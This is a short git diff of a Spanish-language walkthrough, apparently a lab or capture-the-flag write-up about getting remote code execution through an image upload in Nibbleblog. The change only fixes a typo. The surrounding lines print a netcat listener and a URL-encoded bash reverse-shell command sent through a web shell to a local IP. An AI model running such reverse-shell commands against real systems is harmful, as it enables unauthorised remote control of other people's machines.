@@ -91,7 +91,7 @@ Y vemos que en el exploit pone que la imagen que se sube se almacena en `/nibble
 
 ![image](https://github.com/user-attachments/assets/76d6361c-9b8a-4ca9-928c-e5da92ac5e0d)
 
-Así que ya tenemos un RCE. Nos ponemso en escucha por el puerto 443: `nc -nlvp 443`, y en la web-shell ejecutamos el comando `/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"` para ganar la consola:
+Así que ya tenemos un RCE. Nos ponemos en escucha por el puerto 443: `nc -nlvp 443`, y en la web-shell ejecutamos el comando `/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"` para ganar la consola:
 
 ![image](https://github.com/user-attachments/assets/c0406c2a-be89-4265-acbd-2d0e023ec527)
 
